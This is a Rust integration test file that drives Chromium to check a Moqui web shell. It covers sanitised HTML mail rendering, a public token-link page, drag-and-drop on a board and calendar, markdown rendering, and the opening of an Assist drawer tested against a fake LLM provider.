         quote: !!d.querySelector('details.m-hv-quote:not([open]) > summary.m-hv-more'), \
         policy: d.querySelector('meta[http-equiv=\"Content-Security-Policy\"]').content, \
         fetched: {}.contentWindow.performance.getEntriesByType('resource').map((entry) => entry.name).filter((name) => name.indexOf('MoquiLogo') >= 0) }}; }})()",
        doc("DesignedMessage"),
        frame("DesignedMessage")
    ));
    assert_eq!(cleaned["scripts"], 0, "{cleaned}");
    assert_eq!(cleaned["handlers"], 0, "{cleaned}");
    assert_eq!(cleaned["forms"], 0, "{cleaned}");
    assert_eq!(cleaned["remote"], 0, "{cleaned}");
    assert_eq!(
        cleaned["blocked"], 1,
        "the remote picture is a placeholder, the pixel is gone: {cleaned}"
    );
    assert_eq!(cleaned["cid"], 1, "the cid: image from the host's file: {cleaned}");
    assert_eq!(cleaned["bad"], 0, "{cleaned}");
    assert_eq!(cleaned["good"], "noopener noreferrer", "{cleaned}");
    assert_eq!(cleaned["target"], "_blank", "{cleaned}");
    assert_eq!(cleaned["fixed"], 0, "{cleaned}");
    assert_eq!(cleaned["quote"], true, "{cleaned}");
    assert!(
        cleaned["policy"].as_str().unwrap().contains("img-src data:;"),
        "{cleaned}"
    );
    assert_eq!(
        cleaned["fetched"],
        serde_json::json!([]),
        "no remote image was requested: {cleaned}"
    );
    assert_eq!(
        browser.eval("document.querySelector('#DesignedMessage').dataset.blocked"),
        "2",
        "the picture and the banner's background"
    );
    assert_clean(&mut browser, "the designed message");

    // the reply history opens with a click in the frame, and the frame grows to it
    let closed = browser
        .eval(&format!("{}.offsetHeight", frame("DesignedMessage")))
        .as_f64()
        .unwrap();
    let point = browser.eval(&format!(
        "(() => {{ const f = {}; f.scrollIntoView({{block: 'center'}}); const s = f.contentDocument.querySelector('summary.m-hv-more'); \
         const a = f.getBoundingClientRect(), b = s.getBoundingClientRect(); return [a.left + b.left + b.width / 2, a.top + b.top + b.height / 2]; }})()",
        frame("DesignedMessage")
    ));
    let (x, y) = (point[0].as_f64().unwrap(), point[1].as_f64().unwrap());
    for kind in ["mouseMoved", "mousePressed", "mouseReleased"] {
        browser.call(
            "Input.dispatchMouseEvent",
            serde_json::json!({"type": kind, "x": x, "y": y, "button": "left", "buttons": if kind == "mousePressed" { 1 } else { 0 }, "clickCount": 1}),
        );
    }
    let height = format!("{}.offsetHeight", frame("DesignedMessage"));
    browser.wait_for(
        "the reply history open and the frame grown to it",
        &format!(
            "!!{}.querySelector('details.m-hv-quote[open]') && {height} > {closed} + 20 && {}",
            doc("DesignedMessage"),
            fits("DesignedMessage")
        ),
        WAIT,
    );
    assert_eq!(browser.eval("window.__htmlViewRan === undefined"), true);

    // Show images: the remote picture loads, the bar is gone, the pixel and the banner's background too
    browser.click(
        "Show images",
        "document.querySelector('#DesignedMessage .m-html-view-show')",
    );
    browser.wait_for(
        "the remote picture loaded",
        &format!(
            "(() => {{ const img = {}.getElementById('remotePicture'); return !!img && img.complete && img.naturalWidth > 0; }})() \
             && !document.querySelector('#DesignedMessage .m-html-view-images') && {}",
            doc("DesignedMessage"),
            fits("DesignedMessage")
        ),
        WAIT,
    );
    assert!(browser
        .eval(&format!(
            "{}.querySelector('meta[http-equiv=\"Content-Security-Policy\"]').content",
            doc("DesignedMessage")
        ))
        .as_str()
        .unwrap()
        .contains("img-src data: https: http:"));
    assert_eq!(browser.eval("window.__htmlViewRan === undefined"), true);
    assert_clean(&mut browser, "the images shown");

    // the plain message: escaped, its links, its quote collapsed
    let plain = browser.eval(&format!(
        "(() => {{ const d = {}; return {{ bold: d.querySelectorAll('b').length, text: d.querySelector('.m-hv-plain').textContent, \
         links: Array.from(d.querySelectorAll('a')).map((a) => a.href), quote: !!d.querySelector('details.m-hv-quote > summary') }}; }})()",
        doc("PlainMessage")
    ));
    assert_eq!(plain["bold"], 0, "{plain}");
    assert!(
        plain["text"].as_str().unwrap().contains("Use <b>plain</b> words"),
        "{plain}"
    );
    assert_eq!(
        plain["links"],
        serde_json::json!([
            "https://moqui.org/docs",
            "mailto:ada@example.com",
            "mailto:bob@example.com"
        ]),
        "{plain}"
    );
    assert_eq!(plain["quote"], true, "{plain}");

    // dark mode: the plain message follows it, the designed one stays a light card
    browser.eval("moqui.webrootVue.$q.dark.set(true), true");
    browser.wait_for(
        "the plain message in dark mode",
        &format!(
            "(() => {{ const d = {}; return !!d && !!d.body && getComputedStyle(d.body).color === 'rgb(227, 227, 227)'; }})() && {}",
            doc("PlainMessage"),
            fits("PlainMessage")
        ),
        WAIT,
    );
    browser.wait_for(
        "the designed message a light card",
        &format!(
            "{}.classList.contains('m-html-view-card') && (() => {{ const d = {}; return !!d && !!d.documentElement && \
             getComputedStyle(d.documentElement).backgroundColor === 'rgb(255, 255, 255)'; }})()",
            frame("DesignedMessage"),
            doc("DesignedMessage")
        ),
        WAIT,
    );
    assert_clean(&mut browser, "dark mode");

    if let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") {
        use base64::Engine as _;
        let dir = std::path::Path::new(&dir);
        std::fs::create_dir_all(dir).unwrap();
        for (width, height) in [(1280, 900), (390, 844)] {
            browser.call(
                "Emulation.setDeviceMetricsOverride",
                serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
            );
            for dark in [false, true] {
                browser.eval(&format!(
                    "moqui.webrootVue.$q.dark.set({dark}), window.scrollTo(0, 0), true"
                ));
                browser.wait_for("the frames sized", &fits("DesignedMessage"), WAIT);
                browser.pump(Duration::from_millis(800));
                let shot = browser.call(
                    "Page.captureScreenshot",
                    serde_json::json!({"format": "png", "captureBeyondViewport": true}),
                );
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(shot["data"].as_str().unwrap())
                    .unwrap();
                let mode = if dark { "dark" } else { "light" };
                std::fs::write(dir.join(format!("html-view-{mode}-{width}.png")), bytes).unwrap();
            }
        }
    }
}

/// The public shell of a token route in Chromium: the page mounts the route's screen with the m-* components, with no
/// session user, no /qapps header or drawers, and a clean console.
#[test]
fn a_token_route_page_mounts_its_screen_in_the_public_shell() {
    let gate = common::start_token_route("browser-token");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    browser.navigate(&format!("{base}/tk/{}", common::LINK_TOKEN));
    browser.wait_for(
        "the shared screen in the public shell",
        "(() => { const root = document.getElementById('public-root'); \
         return !!root && root.style.display !== 'none' && root.innerText.includes('For the gate') \
         && root.innerText.includes('Shared by John Doe'); })()",
        WAIT,
    );
    let shell: serde_json::Value = browser.eval(
        "(() => ({ header: !!document.querySelector('.q-header'), drawer: !!document.querySelector('.q-drawer'), \
         apps: !!document.getElementById('apps-root'), box: !!document.querySelector('#public-root .q-card, #public-root .q-expansion-item, #public-root [class*=\"m-container-box\"], #public-root .q-item') }))()",
    );
    assert_eq!(shell["header"], false, "{shell}");
    assert_eq!(shell["drawer"], false, "{shell}");
    assert_eq!(shell["apps"], false, "{shell}");
    assert_clean(&mut browser, "/tk");
    // a bad token: the short page, no shell
    browser.navigate(&format!("{base}/tk/NoSuchToken0000000000"));
    browser.wait_for(
        "the expired page",
        "document.body && document.body.innerText.includes('This link has expired or was not found.')",
        WAIT,
    );
}

/// Drag with the mouse from one element to another (each a JavaScript expression of an element), in steps with time between them,
/// so SortableJS's fallback (it polls the element under the pointer) and the calendar's pointer handlers see the moves.
fn drag(browser: &mut Browser, what: &str, from: &str, to: &str) {
    let center = |browser: &mut Browser, element: &str| -> (f64, f64) {
        let rect = browser.eval(&format!(
            "(() => {{ const el = {element}; if (!el) return null; const r = el.getBoundingClientRect(); return [r.left + r.width / 2, r.top + Math.min(r.height / 2, 14)]; }})()"
        ));
        assert!(rect.is_array(), "{what}: no element {element}");
        (rect[0].as_f64().unwrap(), rect[1].as_f64().unwrap())
    };
    let (x0, y0) = center(browser, from);
    let (x1, y1) = center(browser, to);
    let mouse = |browser: &mut Browser, kind: &str, x: f64, y: f64, buttons: i64| {
        browser.call(
            "Input.dispatchMouseEvent",
            serde_json::json!({"type": kind, "x": x, "y": y, "button": "left", "buttons": buttons, "clickCount": 1}),
        );
    };
    mouse(browser, "mouseMoved", x0, y0, 0);
    mouse(browser, "mousePressed", x0, y0, 1);
    browser.pump(Duration::from_millis(80));
    for step in 1..=12 {
        let part = f64::from(step) / 12.0;
        mouse(browser, "mouseMoved", x0 + (x1 - x0) * part, y0 + (y1 - y0) * part, 1);
        browser.pump(Duration::from_millis(60));
    }
    browser.pump(Duration::from_millis(150));
    mouse(browser, "mouseReleased", x1, y1, 0);
    browser.pump(Duration::from_millis(250));
}

/// The Views screen's board and its calendar in each mode, light and dark, 1280 and 390 px wide, as PNGs in `dir`.
fn views_shots(browser: &mut Browser, base: &str, dir: &std::path::Path) {
    use base64::Engine as _;
    std::fs::create_dir_all(dir).unwrap();
    let save = |browser: &mut Browser, name: &str| {
        browser.pump(Duration::from_millis(600));
        let shot = browser.call("Page.captureScreenshot", serde_json::json!({"format": "png"}));
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(shot["data"].as_str().unwrap())
            .unwrap();
        std::fs::write(dir.join(name), bytes).unwrap();
    };
    for (width, height) in [(1280, 900), (390, 844)] {
        browser.call(
            "Emulation.setDeviceMetricsOverride",
            serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
        );
        for dark in [false, true] {
            let mode = if dark { "dark" } else { "light" };
            for (view, cal_mode) in [
                ("board", ""),
                ("calendar", "month"),
                ("calendar", "week"),
                ("calendar", "day"),
                ("calendar", "list"),
            ] {
                if width < 600 && (cal_mode == "month" || cal_mode == "week") {
                    continue;
                }
                browser.navigate(&format!("{base}/qapps/gallery/Views?view={view}"));
                browser.eval(&format!(
                    "sessionStorage.setItem('moqui.LIST_VIEW_/gallery/Views#ExampleList_cal', JSON.stringify({{mode: '{}', anchor: 20746}})), true",
                    if cal_mode.is_empty() { "month" } else { cal_mode }
                ));
                browser.navigate(&format!("{base}/qapps/gallery/Views?view={view}"));
                browser.wait_for(
                    "the view",
                    &format!("!!document.querySelector('#ExampleList_views[data-view={view}]')"),
                    WAIT,
                );
                browser.eval(&format!("moqui.webrootVue.$q.dark.set({dark}), true"));
                browser.eval("(() => { const el = document.querySelector('#ExampleList_views'); if (el) el.scrollIntoView(); return true; })()");
                let name = if cal_mode.is_empty() {
                    view.to_string()
                } else {
                    format!("{view}-{cal_mode}")
                };
                save(browser, &format!("views-{name}-{mode}-{width}.png"));
            }
        }
    }
    browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));
}
/// The statusId and exampleDate of an example, read on the server.
fn example_row(gate: &common::Gate, example_id: &str) -> (String, String) {
    use moqui_lib::object::{to_plain_string, Value};
    let factory = gate.server.factory();
    let ctx = factory.new_context();
    let entered = ctx.enter();
    let authz = ctx.disable_authz();
    let row = factory
        .entity()
        .unwrap()
        .find("moqui.example.Example")
        .unwrap()
        .eq("exampleId", Value::string(example_id))
        .use_cache(false)
        .one()
        .unwrap()
        .unwrap();
    let out = (
        row.get("statusId").map(to_plain_string).unwrap_or_default(),
        row.get("exampleDate").map(to_plain_string).unwrap_or_default(),
    );
    drop(authz);
    drop(entered);
    out
}

/// The list views of the gallery (style-guide §8.2): the Views screen's form-list opens as its board, a column per Example status in
/// the flow's order; a card dragged to the next status posts the board's transition and stays there (the database has the status),
/// a card dragged where the flow does not lead is refused, goes back and the answer's message shows; the calendar's month has the
/// examples on their days, and an event dragged to another day posts the new start and end (the database has it, and a reload
/// shows it there); back to the list, the rows come again from the server.
#[test]
fn the_form_list_board_and_calendar_move_cards_and_events_in_chromium() {
    let gate = start_with_data(
        "browser-views",
        r#"<entity-facade-xml type="seed">
            <moqui.example.Example exampleId="GX_A" exampleName="Gate card A" exampleTypeEnumId="EXT_MADE_UP" statusId="EXST_IN_DESIGN"
                exampleSize="3" exampleDate="1792519200000" exampleEndDate="1792522800000"/>
            <moqui.example.Example exampleId="GX_B" exampleName="Gate card B" exampleTypeEnumId="EXT_REAL_WORLD" statusId="EXST_DEFINED"
                exampleSize="5" exampleDate="1792594800000" exampleEndDate="1792598400000"/>
            <moqui.example.Example exampleId="GX_C" exampleName="Overlapping review" exampleTypeEnumId="EXT_REAL_WORLD" statusId="EXST_APPROVED"
                exampleSize="8" exampleDate="1792521000000" exampleEndDate="1792526400000"/>
            <moqui.example.Example exampleId="GX_D" exampleName="Planning day" exampleTypeEnumId="EXT_INSPIRED" statusId="EXST_IMPLEMENTED"
                exampleSize="13" exampleDate="1792558800000" exampleEndDate="1792645200000" allDay="Y"/>
            <moqui.example.Example exampleId="GX_E" exampleName="Release" exampleTypeEnumId="EXT_CONTRIVED" statusId="EXST_COMPLETE"
                exampleSize="2" exampleDate="1792677600000" exampleEndDate="1792681200000"/>
            <moqui.example.Example exampleId="GX_F" exampleName="Retrospective" exampleTypeEnumId="EXT_MADE_UP" statusId="EXST_IN_DESIGN"
                exampleSize="1" exampleDate="1793030400000" exampleEndDate="1793034000000"/>
        </entity-facade-xml>"#,
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    browser.call(
        "Emulation.setDeviceMetricsOverride",
        serde_json::json!({"width": 1920, "height": 1000, "deviceScaleFactor": 1, "mobile": false}),
    );
    sign_in(&mut browser, &base);
    browser.navigate(&format!("{base}/qapps/gallery/Views"));
    browser.eval(FETCH_SPY);
    let card = |title: &str| {
        format!("Array.from(document.querySelectorAll('#ExampleList_views .m-board-card')).find((el) => el.innerText.indexOf({title:?}) >= 0)")
    };
    let column_of = |title: &str| {
        format!(
            "(() => {{ const el = {}; return el ? el.closest('.m-board-col').dataset.value : null; }})()",
            card(title)
        )
    };
    let cards_of = |status: &str| {
        format!("document.querySelector('#ExampleList_views .m-board-col[data-value={status}] .m-board-cards')")
    };
    browser.wait_for(
        "the board with a column per status",
        "!!document.querySelector('#ExampleList_views[data-view=board] .m-board-col') && document.querySelectorAll('#ExampleList_views .m-board-card').length === 6",
        WAIT,
    );
    assert_eq!(
        browser.eval("Array.from(document.querySelectorAll('#ExampleList_views .m-board-col')).map((el) => el.dataset.value).join(',')"),
        "EXST_IN_DESIGN,EXST_DEFINED,EXST_APPROVED,EXST_IMPLEMENTED,EXST_TESTED,EXST_COMPLETE,EXST_CANCELLED"
    );
    assert_eq!(
        browser.eval("document.querySelector('#ExampleList_views .m-board-col[data-value=EXST_DEFINED] .m-board-col-label').innerText.trim()"),
        "Defined"
    );
    assert_eq!(browser.eval(&column_of("Gate card B")), "EXST_DEFINED");
    assert_eq!(
        browser.eval("!!document.querySelector('#ExampleList_views .m-list-views-list .form-list-nav-row') && document.querySelector('#ExampleList_views .m-list-views-list .tbody').offsetParent === null"),
        true,
        "the list's nav row stays and its rows are hidden"
    );
    assert_clean(&mut browser, "the board");

    // a card to the next status: the transition posts the key and the new status, and the card stays there
    drag(
        &mut browser,
        "Gate card B to Approved",
        &card("Gate card B"),
        &cards_of("EXST_APPROVED"),
    );
    let moved = fetched(&mut browser, "the status move", "/updateExampleStatus");
    assert_eq!(moved["status"], 200, "{moved}");
    browser.wait_for(
        "the card in Approved",
        &format!("{} === 'EXST_APPROVED'", column_of("Gate card B")),
        WAIT,
    );
    assert_eq!(example_row(&gate, "GX_B").0, "EXST_APPROVED");
    assert_clean(&mut browser, "a card moved");

    // a move the flow does not allow: refused, the card goes back, the message shows
    drag(
        &mut browser,
        "Gate card A to Implemented",
        &card("Gate card A"),
        &cards_of("EXST_IMPLEMENTED"),
    );
    browser.wait_for(
        "the refused move's answer",
        "window.__gate.fetches.filter((f) => f.url.indexOf('/updateExampleStatus') >= 0).length === 2",
        WAIT,
    );
    browser.wait_for(
        "the refusal's message and the card back in In Design",
        &format!(
            "{} === 'EXST_IN_DESIGN' && Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('Status change not allowed') >= 0)",
            column_of("Gate card A")
        ),
        WAIT,
    );
    assert_eq!(example_row(&gate, "GX_A").0, "EXST_IN_DESIGN");
    let problems = browser.take_problems();
    assert!(
        problems.iter().all(|problem| {
            let text = format!("{problem:?}");
            text.contains("500") || text.contains("request failed")
        }),
        "only the refusal's answer: {problems:#?}"
    );

    // the calendar: the month with the examples on their days; an event dragged two days later
    browser.click(
        "Calendar",
        "document.querySelector('#ExampleList_views .m-list-views-toggle [data-view=calendar]')",
    );
    let chip = |title: &str| {
        format!("Array.from(document.querySelectorAll('#ExampleList_views .m-cal-month .m-cal-chip')).find((el) => el.innerText.indexOf({title:?}) >= 0)")
    };
    let day_of = |title: &str| {
        format!(
            "(() => {{ const el = {}; return el ? Number(el.closest('[data-day]').dataset.day) : null; }})()",
            chip(title)
        )
    };
    browser.wait_for(
        "the month with the examples",
        &format!(
            "!!document.querySelector('#ExampleList_views[data-view=calendar] .m-cal-month') && !!{}",
            chip("Gate card A")
        ),
        WAIT,
    );
    // 2026-10-20 in US/Central, the user's zone
    assert_eq!(browser.eval(&day_of("Gate card A")), 20746);
    drag(
        &mut browser,
        "Gate card A two days later",
        &chip("Gate card A"),
        "document.querySelector('#ExampleList_views .m-cal-cell[data-day=\"20748\"]')",
    );
    let timed = fetched(&mut browser, "the time move", "/updateExampleTimes");
    assert_eq!(timed["status"], 200, "{timed}");
    browser.wait_for(
        "the event on its new day",
        &format!("{} === 20748", day_of("Gate card A")),
        WAIT,
    );
    assert_eq!(
        example_row(&gate, "GX_A").1,
        "1792692000000",
        "13:00 Central two days later"
    );
    assert_clean(&mut browser, "an event moved");

    // the page again: the calendar is the view kept for the form, and the event is on its new day
    browser.navigate(&format!("{base}/qapps/gallery/Views"));
    browser.wait_for(
        "the calendar again, the event moved",
        &format!(
            "!!document.querySelector('#ExampleList_views[data-view=calendar]') && {} === 20748",
            day_of("Gate card A")
        ),
        WAIT,
    );
    // back to the list
    browser.click(
        "List",
        "document.querySelector('#ExampleList_views .m-list-views-toggle [data-view=list]')",
    );
    browser.wait_for(
        "the list's rows",
        "!!document.querySelector('#ExampleList_views[data-view=list]') && document.querySelector('#ExampleList_views .tbody').offsetParent !== null && document.querySelector('#ExampleList_views .tbody').innerText.indexOf('Gate card B') >= 0",
        WAIT,
    );
    assert_clean(&mut browser, "the list again");

    // range-find: with a page of two rows the calendar still shows the month's examples, asked of the form request for the dates it
    // shows (the find with the range added and no paging), while the list keeps its page of two
    browser.navigate(&format!("{base}/qapps/gallery/Views?pageSize=2&view=calendar"));
    browser.wait_for(
        "the month with an example beyond the list's page",
        &format!(
            "!!document.querySelector('#ExampleList_views[data-view=calendar] .m-cal-month') && !!{} && !!{}",
            chip("Retrospective"),
            chip("Release")
        ),
        WAIT,
    );
    assert_eq!(
        browser.eval("document.querySelectorAll('#ExampleList_views .m-list-views-list .tbody .tr').length"),
        2,
        "the list keeps its page"
    );
    // the next month asks again, for its own dates
    browser.eval(FETCH_SPY);
    browser.click(
        "the next month",
        "document.querySelector('#ExampleList_views .m-cal-next')",
    );
    let asked = fetched(&mut browser, "the next month's rows", "/actions/ExampleList");
    assert_eq!(asked["status"], 200, "{asked}");
    let asked_url = asked["url"].as_str().unwrap_or_default().to_string();
    assert!(
        asked_url.contains("pageNoLimit=true")
            && asked_url.contains("exampleDate_")
            && !asked_url.contains("pageSize="),
        "{asked_url}"
    );
    assert_clean(&mut browser, "the calendar's range");

    // the markdown-view of the Widgets screen: Marked and DOMPurify load, the heading has its id, a table its container, a link to
    // another site opens in a new tab with noopener, and an app link (from the base path) goes through the shell
    browser.navigate(&format!("{base}/qapps/gallery/Widgets"));
    browser.wait_for(
        "the markdown rendered",
        "!!document.querySelector('#WidgetMarkdown h2#md-markdown-view')",
        WAIT,
    );
    assert_eq!(
        browser.eval("(() => { const md = document.getElementById('WidgetMarkdown'); return [!!md.querySelector('.m-md-table table.q-table'), \
            !!md.querySelector('a[href=\"https://moqui.org\"][target=_blank][rel=\"noopener noreferrer\"]'), !!md.querySelector('pre code'), \
            !!md.querySelector('a[data-md-link][href=\"/qapps/gallery/List\"]')].join(','); })()"),
        "true,true,true,true"
    );
    // a table narrower than the text: its container (and the container's border) is as wide as the table, not the text
    assert_eq!(
        browser.eval("(() => { const md = document.getElementById('WidgetMarkdown'); const box = md.querySelector('.m-md-table'); \
            const table = box.querySelector('table'); const boxWidth = box.getBoundingClientRect().width; \
            return [Math.abs(boxWidth - table.getBoundingClientRect().width) <= 3, boxWidth < md.getBoundingClientRect().width - 40].join(','); })()"),
        "true,true"
    );
    browser.click(
        "the app link",
        "document.querySelector('#WidgetMarkdown a[data-md-link]')",
    );
    browser.wait_for(
        "the List screen through the shell",
        "location.pathname === '/qapps/gallery/List' && !!document.querySelector('.q-table')",
        WAIT,
    );
    assert_clean(&mut browser, "the markdown view");

    if let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") {
        views_shots(&mut browser, &base, std::path::Path::new(&dir));
        assert_clean(&mut browser, "the views in each mode, light and dark");
    }
}

/// The Assist drawer (docs/Assist.md "The drawer"; plans/LLM-A2A-Assist.md 13.5) driven as a user would, against the scripted fake
/// provider: a run streams into the thread, a reload re-attaches to it, a page of the build without the compiler runs it, a gallery
/// hand-off reports the refused save and then the saved one, the user's own navigation wins over the agent's, only the tab that
/// owns follow follows, and an approval executes while a second tab sees it.
#[cfg(all(feature = "llm", feature = "tui"))]
mod assist {
    use std::time::Duration;

    use moqui_core::llm::provider::fake::{self, Reply, Step};
    use moqui_lib::object::{to_plain_string, Value};
    use serde_json::json;

    use super::common::cdp::Browser;
    use super::common::{start_with_conf_files, Gate};
    use super::{assert_clean, by_text, key_chord, sign_in, FETCH_SPY, WAIT};

    const ENDPOINT: &str = "gate-assist";

    /// The fake endpoint for the assist feature, a record the fixture screen edits, and the fixture screens for ADMIN.
    const DATA: &str = r#"<entity-facade-xml type="seed">
        <moqui.llm.LlmEndpoint endpointId="gate-assist" protocol="fake" description="Gate assist fake" isLocal="Y"/>
        <moqui.llm.LlmModel modelId="gate-assist-fast" endpointId="gate-assist" providerModel="fake-fast" tier="fast" contextWindow="32768"/>
        <moqui.llm.LlmFeatureBinding featureId="assist" modelId="gate-assist-fast" reasoningLevel="none"/>
        <moqui.basic.EnumerationType enumTypeId="AST_GATE" description="Before"/>
        <moqui.security.ArtifactGroup artifactGroupId="ASSIST_GATE" description="Assist gate screens"/>
        <moqui.security.ArtifactGroupMember artifactGroupId="ASSIST_GATE" artifactName="component://assistgate/.*"
            nameIsPattern="Y" artifactTypeEnumId="AT_XML_SCREEN" inheritAuthz="Y"/>
        <moqui.security.ArtifactGroupMember artifactGroupId="ASSIST_GATE" artifactName="component://assistgate/.*"
            nameIsPattern="Y" artifactTypeEnumId="AT_XML_SCREEN_TRANS" inheritAuthz="Y"/>
        <moqui.security.ArtifactGroupMember artifactGroupId="ASSIST_GATE" artifactName=".*EnumerationType"
            nameIsPattern="Y" artifactTypeEnumId="AT_SERVICE"/>
        <moqui.security.ArtifactAuthz artifactAuthzId="ASSIST_GATE_ADMIN" userGroupId="ADMIN" artifactGroupId="ASSIST_GATE"
            authzTypeEnumId="AUTHZT_ALWAYS" authzActionEnumId="AUTHZA_ALL"/>
    </entity-facade-xml>"#;


    /// The fixture component, mounted under the apps root by its own conf: Edit saves the record's description through a service; Slow takes a few seconds to render, so the
    /// user can move while the agent's command runs.
    const FILES: &[(&str, &str)] = &[
        ("component/assistgate/component.xml", r#"<component name="assistgate"/>"#),
        (
            "component/assistgate/MoquiConf.xml",
            r#"<moqui-conf><screen-facade><screen location="component://webroot/screen/webroot/apps.xml">
    <subscreens-item name="assistgate" menu-title="Assist Gate" menu-include="false" location="component://assistgate/screen/AssistGate.xml"/>
</screen></screen-facade></moqui-conf>"#,
        ),
        (
            "component/assistgate/screen/AssistGate.xml",
            r#"<screen require-authentication="true" default-menu-title="Assist Gate">
    <subscreens default-item="Edit">
        <subscreens-item name="Edit" location="component://assistgate/screen/AssistGate/Edit.xml"/>
        <subscreens-item name="Slow" location="component://assistgate/screen/AssistGate/Slow.xml"/>
    </subscreens>
    <widgets><subscreens-active/></widgets>
</screen>"#,
        ),
        (
            "component/assistgate/screen/AssistGate/Edit.xml",
            r#"<screen require-authentication="true" default-menu-title="Edit">
    <transition name="updateEnumType"><service-call name="update#moqui.basic.EnumerationType"/>
        <default-response url="."/></transition>
    <actions><entity-find-one entity-name="moqui.basic.EnumerationType" value-field="enumType">
        <field-map field-name="enumTypeId" value="AST_GATE"/></entity-find-one></actions>
    <widgets>
        <form-single name="EditEnumType" transition="updateEnumType" map="enumType">
            <field name="enumTypeId"><default-field><hidden/></default-field></field>
            <field name="description"><default-field title="Description"><text-line/></default-field></field>
            <field name="submitButton"><default-field title="Save"><submit/></default-field></field>
        </form-single>
    </widgets>
</screen>"#,
        ),
        (
            "component/assistgate/screen/AssistGate/Slow.xml",
            r#"<screen require-authentication="true" default-menu-title="Slow">
    <actions><script>const until = Date.now() + 5000; while (Date.now() &lt; until) { }</script></actions>
    <widgets><label text="The slow screen" type="p"/></widgets>
</screen>"#,
        ),
    ];

    /// The gate with the fake, the fixture component and `extra_conf`; `properties` are set once it runs (as
    /// [`super::common::start_with_conf`] does) and cleared when it drops.
    fn start(label: &str, properties: &[(&str, &str)], extra_conf: &str) -> (Gate, super::common::PropertyReset) {
        let gate = start_with_conf_files(label, Some(DATA), extra_conf, &[], FILES);
        for (name, value) in properties {
            moqui_lib::env::set_property(name, (*value).to_string());
        }
        fake::clear(ENDPOINT);
        (gate, super::common::PropertyReset::of(&properties.iter().map(|(name, _)| *name).collect::<Vec<_>>()))
    }

    /// A tool call of the fake model: the screen tool with `arguments`, then the finish that runs it.
    fn screen_call(id: &str, arguments: serde_json::Value, delay: u64) -> Reply {
        let mut steps = Vec::new();
        if delay > 0 {
            steps.push(Step::Delay(delay));
        }
        steps.push(Step::Tool {
            id: id.to_string(),
            name: "screen".to_string(),
            arguments: arguments.to_string(),
            pieces: 1,
        });
        steps.push(Step::Finish("tool_calls".to_string()));
        Reply::steps(steps)
    }

    /// Text in pieces with a pause before each but the first, then a stop.
    fn slow_text(pieces: &[&str], pause: u64) -> Reply {
        let mut steps = Vec::new();
        for (index, piece) in pieces.iter().enumerate() {
            if index > 0 {
                steps.push(Step::Delay(pause));
            }
            steps.push(Step::Text((*piece).to_string()));
        }
        steps.push(Step::Finish("stop".to_string()));
        Reply::steps(steps)
    }

    fn field_of(gate: &Gate, entity: &str, key: &str, id: &str, field: &str) -> String {
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let _entered = ctx.enter();
        let _authz = ctx.disable_authz();
        factory
            .entity()
            .unwrap()
            .find(entity)
            .unwrap()
            .eq(key, Value::string(id))
            .one()
            .unwrap()
            .and_then(|row| row.get(field).map(to_plain_string))
            .unwrap_or_default()
    }

    /// The shell with the Assist button, after its bootstrap.
    fn open_page(browser: &mut Browser, url: &str) {
        browser.navigate(url);
        browser.wait_for(
            "the Assist button",
            "!!document.getElementById('m-assist-button') && !!moqui.assist.state.bootstrap && !!moqui.webrootVue && !moqui.webrootVue.loading",
            WAIT,
        );
    }

    /// Mod+J opens the drawer with the composer focused.
    fn open_drawer(browser: &mut Browser) {
        key_chord(browser, "j", "KeyJ", 74, 2);
        browser.wait_for(
            "the drawer open with the composer focused",
            "(() => { const drawer = document.getElementById('m-assist-drawer'); const active = document.activeElement; \
             return !!drawer && drawer.getBoundingClientRect().width > 300 && !!active && !!active.closest && !!active.closest('#m-assist-composer'); })()",
            WAIT,
        );
    }

    /// Type into the composer and send with Enter.
    fn send(browser: &mut Browser, text: &str) {
        browser.eval(
            "(() => { const input = document.querySelector('#m-assist-composer textarea'); input.focus(); return true; })()",
        );
        browser.type_text(text);
        browser.press("Enter");
    }

    fn convo_of(browser: &mut Browser) -> String {
        browser
            .wait_for("the conversation", "moqui.assist.state.convo.conversationId", WAIT)
            .as_str()
            .unwrap_or_default()
            .to_string()
    }

    /// With `MOQUI_SHELL_SHOTS=<dir>`: the page as it is, the drawer open, light and dark, 1280 and 390 px wide, as
    /// `assist-<name>-<mode>-<width>.png`; then the page as it was.
    fn shots(browser: &mut Browser, name: &str) {
        use base64::Engine as _;
        let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") else { return };
        let dir = std::path::Path::new(&dir);
        std::fs::create_dir_all(dir).unwrap();
        for (width, height) in [(1280, 900), (390, 844)] {
            browser.call(
                "Emulation.setDeviceMetricsOverride",
                json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
            );
            for dark in [false, true] {
                let mode = if dark { "dark" } else { "light" };
                browser.eval(&format!("moqui.webrootVue.$q.dark.set({dark}), true"));
                browser.pump(Duration::from_millis(700));
                let shot = browser.call("Page.captureScreenshot", json!({"format": "png"}));
                let bytes = base64::engine::general_purpose::STANDARD.decode(shot["data"].as_str().unwrap()).unwrap();
                std::fs::write(dir.join(format!("assist-{name}-{mode}-{width}.png")), bytes).unwrap();
            }
        }
        browser.call("Emulation.clearDeviceMetricsOverride", json!({}));
        browser.eval("moqui.webrootVue.$q.dark.set(false), true");
        browser.pump(Duration::from_millis(300));
    }

    /// The text of the thread's assistant rows.
    const ANSWERS: &str =
        "Array.from(document.querySelectorAll('#m-assist-thread [data-assist-item=assistant] .m-assist-markdown')).map((el) => el.innerText.trim()).join('|')";

    /// Mod+J opens the drawer; a message sent with Enter starts a run whose text streams in pieces into one assistant row, and the
    /// done line follows. A reload in the middle of the next run opens the drawer again on its conversation, re-attaches to the
    /// run's stream and ends with its whole text once.
    #[test]
    fn the_assist_drawer_streams_a_run_and_reattaches_after_a_reload_in_chromium() {
        let (gate, _reset) = start("browser-assist", &[], "");
        let base = format!("http://{}", gate.server.address());
        let mut browser = Browser::launch();
        sign_in(&mut browser, &base);
        open_page(&mut browser, &format!("{base}/qapps/gallery/Landing"));
